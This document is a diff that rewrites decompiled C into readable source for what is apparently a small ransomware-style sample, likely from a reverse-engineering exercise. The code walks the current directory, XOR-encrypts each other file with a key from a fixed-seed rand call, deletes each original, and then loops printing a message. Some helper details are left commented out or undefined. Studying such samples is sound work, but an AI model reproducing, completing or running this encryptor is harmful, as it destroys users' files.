@@ -1,59 +1,77 @@
-void main(int argc,char **argv)
+#include <dirent.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdbool.h>  
+
+// Checks if the filetype of the filename is a file.
+bool is_file(char* filename);
+
+void FUN_00100c30(char* filename, ulong* param_2) {
+  char cVar1;
+  ulong uVar2 = 0xffffffffffffffff;
+  ulong *puVar3 = param_2;
+  int bVar4 = 0;
+  //*(undefined2 *)param_2 = 0x2f2e;
+  //*(undefined *)((long)param_2 + 2) = 0;
+  strcat((char *)param_2, filename);
+  do {
+    if (uVar2 == 0) break;
+    uVar2 = uVar2 - 1;
+    cVar1 = *(char *)puVar3;
+    puVar3 = (ulong *)((long)puVar3 + (ulong)bVar4 * -2 + 1);
+  } while (cVar1 != '\0'); // while not NUL (end of line)
+  //*(undefined8 *)((long)param_2 + (~uVar2 - 1)) = 0x616e6f726f632e;
+  return;
+}
+
+// https://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib--io-getc-3.html
+// Read the next character from the file pointer. Returns it as an unsigned char casted to an int.
+int _IO_getc(_IO_FILE * __fp);
+
+int main(int argc,char **argv)
 
 {
-  int iVar1;
-  int iVar2;
+  int iVar1 = rand();
+  int temp_var;
   int iVar3;
-  size_t __n;
-  DIR *__dirp;
-  FILE *__stream;
-  FILE *__stream_00;
-  dirent *pdVar4;
+  size_t arg_zero_length;
+  DIR *working_directory;
+  FILE *original_file_stream;
+  FILE *encrypted_file_stream;
+  struct dirent *current_file;
   long in_FS_OFFSET;
-  ulong local_88;
-  undefined8 local_80;
-  undefined8 local_78;
-  undefined8 local_70;
-  undefined8 local_68;
-  undefined8 local_60;
-  undefined2 local_58;
-  char local_48 [56];
-  undefined8 local_10;
-  
-  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
-  local_88 = 0x20;
-  local_80 = 0;
-  local_78 = 0;
-  local_70 = 0;
-  local_68 = 0;
-  local_60 = 0;
-  local_58 = 0;
+  ulong local_88 = 0x20;
+  char program_name [56];
   srand(0xdeadbeef);
-  iVar1 = rand();
-  __n = strlen(*argv);
-  strncpy(local_48,*argv + 2,__n);
-  __dirp = opendir(".");
-  if (__dirp != (DIR *)0x0) {
-    while (pdVar4 = readdir(__dirp), pdVar4 != (dirent *)0x0) {
-      iVar2 = strcmp(pdVar4->d_name,local_48);
-      if ((iVar2 != 0) && (iVar2 = FUN_00100bca(pdVar4->d_name), iVar2 != 0)) {
-        __stream = fopen(pdVar4->d_name,"rb");
-        FUN_00100c30(pdVar4->d_name,&local_88);
-        __stream_00 = fopen((char *)&local_88,"w");
-        while (iVar2 = feof(__stream), iVar2 == 0) {
-          iVar2 = _IO_getc(__stream);
-          iVar3 = feof(__stream);
+  arg_zero_length = strlen(*argv);
+  strncpy(program_name,*argv + 2,arg_zero_length); // copy value of arg0 minus './' to local_48
+  working_directory = opendir(".");
+  if (working_directory != NULL) {
+    while (current_file = readdir(working_directory), current_file != NULL) {
+      temp_var = strcmp(current_file->d_name,program_name); // 0 if equal
+                                                         // positive if current_file is greater than program_name
+                                                         // negative if current_file is less than program_name
+      if ((temp_var != 0) && (temp_var = is_file(current_file->d_name), temp_var != 0)) {
+        // If the name of the current_file didn't match the program name
+        // and if the file type of the current_file is a file... then.
+        original_file_stream = fopen(current_file->d_name,"rb");
+        FUN_00100c30(current_file->d_name,&local_88);
+        encrypted_file_stream = fopen((char *)&local_88,"w");
+        while (temp_var = feof(original_file_stream), temp_var == 0) {
+          temp_var = _IO_getc(original_file_stream);
+          iVar3 = feof(original_file_stream);
           if (iVar3 == 0) {
-            fputc((int)(char)((byte)iVar2 ^ (byte)(iVar1 % 0xff)),__stream_00);
+            fputc((int)(char)((int)temp_var ^ (int)(iVar1 % 0xff)),encrypted_file_stream);
           }
         }
-        fclose(__stream);
-        remove(pdVar4->d_name);
-        fclose(__stream_00);
+        fclose(original_file_stream); // close the handle to the file stream
+        remove(current_file->d_name); // remove the original file
+        fclose(encrypted_file_stream); // close the handle to the file stream
       }
       local_88 = local_88 & 0xffffffffffffff00;
     }
-    closedir(__dirp);
+    closedir(working_directory);
   }
   do {
     puts(
@@ -115,5 +133,5 @@ void main(int argc,char **argv)
         );
     sleep(1);
     system("clear");
-  } while( true );
+  } while( 1 );
 }
